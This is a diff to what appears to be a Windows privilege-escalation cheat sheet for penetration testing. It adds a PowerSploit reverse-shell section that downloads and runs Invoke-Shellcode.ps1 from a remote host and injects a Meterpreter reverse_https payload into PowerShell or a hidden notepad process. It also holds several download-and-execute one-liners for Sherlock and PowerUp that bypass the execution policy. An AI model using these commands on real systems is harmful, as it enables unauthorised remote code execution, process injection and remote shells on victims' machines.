@@ -11,17 +11,26 @@ python windows-exploit-suggester.py --database <db file name> --systeminfo <file
 
 ---------------------------Powersploit---------------------------
 
+# Reverse Shell
 
+# download Code Execution PowerShell script "Invoke-ShellCode"
+IEX (New-Object Net.WebClient).DownloadString("http://<targetip>:<port>/CodeExecution/Invoke-Shellcode.ps1")
 
+# Inject payload into the current PowerShell process
+Invoke-Shellcode -payload windows/meterpreter/reverse_https -Lhost <ip> -Lport <port> -Force
 
+# inject into another process
+Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden
+Invoke-Shellcode -ProcessId <process id> -payload windows/meterpreter/reverse_https -Lhost <ip> -Lport <port> -Force
 
+# setup a Multi Handler exploit and wait for a shell
 
 ---------------------------Sherlock---------------------------
 
 # send the sherlock.ps1 file to low privileged shell and run it
-echo IEX(New Object Net.WebClient).downloadString('http://<targetip>:<port>/Sherlock.ps1') | powershell -noprofile -
+echo IEX(New Object Net.WebClient).downloadString('http://<ip>:<port>/Sherlock.ps1') | powershell -noprofile -
 
-powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<targetip>:<port>/Sherlock.ps1') ; Find-AllVulns"
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/Sherlock.ps1') ; Find-AllVulns"
 
 # If you have your ps1 file downloaded to the victim machine then run using this
 powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
@@ -37,10 +46,10 @@ getuid
 ----------------------------------------PowerUp----------------------------------
 
 # download PowerUp.ps1 and check for vulnerabilities
-powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<targetip>:<port>/PowerUp.ps1') ; Invoke-AllChecks"
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/PowerUp.ps1') ; Invoke-AllChecks"
 
 # change execution policy & download PowerUp.ps1 and check for vulnerabilities
-powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://<targetip>:<port>/powerup.ps1') ; Invoke-AllChecks"
+powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/powerup.ps1') ; Invoke-AllChecks"
 
 # If you have your ps1 file downloaded to the victim machine then run using this
 powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
